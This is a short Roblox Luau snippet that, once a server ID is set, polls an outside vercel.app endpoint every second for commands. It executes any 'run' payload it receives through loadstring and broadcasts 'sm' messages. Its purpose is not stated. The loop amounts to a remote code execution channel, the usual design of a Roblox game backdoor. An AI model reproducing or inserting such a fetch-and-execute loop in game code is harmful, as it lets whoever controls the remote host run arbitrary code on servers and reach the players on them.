task.defer(function()
	local sidObject = ReplicatedStorage:WaitForChild("ServerId")

	repeat task.wait()
	until sidObject.Value ~= 0

	local id = sidObject.Value
	print("Listening")

	while true do
		local data = HttpService:GetAsync("https://alias-colorful.vercel.app/api/get?id=" .. id)
		local json = HttpService:JSONDecode(data)
		
		local messages = json.messages
		for _, message in messages do
			print(message)

			local parsed = parse(message)
			local cmd = table.remove(parsed, 1)
			
			if cmd == "run" then
				loadstring(parsed[1])()
			elseif cmd == "sm" then
				mm.message(parsed[1])
			end
		end
		
		task.wait(1.1)
	end
end)
